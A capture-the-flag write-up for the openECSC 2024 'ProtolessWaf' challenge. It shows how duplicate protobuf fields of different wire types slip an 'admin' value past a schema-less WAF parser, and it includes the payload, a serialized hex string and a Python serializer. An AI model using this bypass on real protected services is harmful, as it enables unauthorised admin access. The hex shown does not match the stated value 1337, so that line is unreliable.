# openECSC 2024 - Round 1

## [misc] ProtolessWaf (146 solves)

I found this cool parser for protobuf that does not require a .proto file. I'm using it in a WAF to prevent admin access to my server, I hope it works as expected.

Site: [http://protolesswaf.challs.open.ecsc2024.it](http://protolesswaf.challs.open.ecsc2024.it)

Author: Giovanni Minotti <@giotino>

## Solution

We are presented with a web application that accept a protobuf payload and a WAF that shields it from gaining admin access to obtain the flag.

The application has a standard protobuf implementation, while the WAF has a custom implementation that does not require a `.proto` file, since it can detect the field type.

Protobuf considers the field type described in the `.proto` file, discarding any field that does not match the expected type. However, the WAF does not require a `.proto` file, so it takes the first type as the expected type.

We can craft a payload that contains the field with a wrong type and the same field with the `.proto` type, in this order. The WAF will accept the field with the wrong type and use it to verify that the user is not admin, but the application will take the value of the field with the correct type.

Payload (before serialization):

```python
{"field_number": 1, "type": "varint", "value": 1337},
{"field_number": 1, "type": "length-delimited", "value": b"admin"}
```

Payload (after serialization): `08c0c4070a0561646d696e`

The following code block contains the implementation of a custom serializer that can be used to craft the payload:

```python
import struct


def create_byte_from_field_number_and_type(field_number, wire_type):
    return (field_number << 3) | wire_type


def encode_varint(value):
    result = b""
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            result += bytes([byte | 0x80])
        else:
            result += bytes([byte])
            break
    return result


def build_message(fields):
    message = b""
    for field in fields:
        wire_type = 0
        if field["type"] == "varint":
            wire_type = 0
            message += bytes(
                [
                    create_byte_from_field_number_and_type(
                        field["field_number"], wire_type
                    )
                ]
            )
            message += encode_varint(field["value"])
        elif field["type"] == "fixed64":
            wire_type = 1
            message += bytes(
                [
                    create_byte_from_field_number_and_type(
                        field["field_number"], wire_type
                    )
                ]
            )
            message += struct.pack("<Q", field["value"])
        elif field["type"] == "length-delimited":
            wire_type = 2
            message += bytes(
                [
                    create_byte_from_field_number_and_type(
                        field["field_number"], wire_type
                    )
                ]
            )
            message += encode_varint(len(field["value"]))
            message += field["value"]
        elif field["type"] == "fixed32":
            wire_type = 5
            message += bytes(
                [
                    create_byte_from_field_number_and_type(
                        field["field_number"], wire_type
                    )
                ]
            )
            message += struct.pack("<I", field["value"])
    return message


message = build_message(
    [
        {"field_number": 1, "type": "varint", "value": 1337},
        {"field_number": 1, "type": "length-delimited", "value": b"admin"},
    ]
)

print(message.hex())
```
